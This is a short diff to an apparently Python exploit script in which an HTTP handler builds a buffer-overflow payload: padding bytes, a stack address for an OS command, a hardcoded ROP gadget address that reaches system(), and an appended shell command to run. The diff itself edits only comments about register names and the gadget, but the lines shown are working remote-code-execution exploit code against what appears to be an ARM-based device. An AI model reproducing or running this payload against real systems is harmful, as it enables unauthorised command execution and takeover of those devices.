@@ -94,9 +94,9 @@ class HttpHandler(BaseHTTPRequestHandler):
 
         # Generate payload
         p  = b"A"*368                                   # [   0: 367]
-        p += cmd_addr.to_bytes(4, "little")             # [ 368: 371] g0_r6_val (stack addr. of OS command)
+        p += cmd_addr.to_bytes(4, "little")             # [ 368: 371] g0_r0_val (stack addr. of OS command)
         p += b"B"*20                                    # [ 372: 391]
-        p += b"\xb8\xc9\x00\x00"                        # [ 392: 395] g0_pc_val (code addr. of ROP gadget 1: mov r0, r6; bl #0x94a0 <system@plt>)
+        p += b"\xb8\xc9\x00\x00"                        # [ 392: 395] g0_pc_val (addr. of ROP gadget 1)
         max_cmd_len = 1024-len(p)-2-2
         p += b"X"*max(0, (max_cmd_len-len(cmd))) + b";" # [ 396:   L] Fill up with an nonexistent command
         p += bytes(cmd, "UTF-8")[:max_cmd_len]          # [ L+1:1020] OS command to execute
